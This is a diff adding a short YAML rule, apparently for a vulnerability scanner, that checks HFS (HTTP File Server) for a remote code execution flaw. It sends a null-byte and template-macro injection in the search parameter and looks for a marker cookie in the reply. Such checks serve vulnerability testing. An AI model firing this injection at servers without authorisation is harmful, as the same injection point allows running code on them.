@@ -1,0 +1,12 @@
+name: hfs-rce
+rules:
+  - method: GET
+    path: /?search==%00{.cookie|out|value%3dreg002.}
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    expression: |
+      response.status == 200 && response.headers["Set-Cookie"].contains("out=reg002;")
+detail:
+  author: Teahim
+  links:
+    - https://www.bbsmax.com/A/Ae5RqXBmJQ/
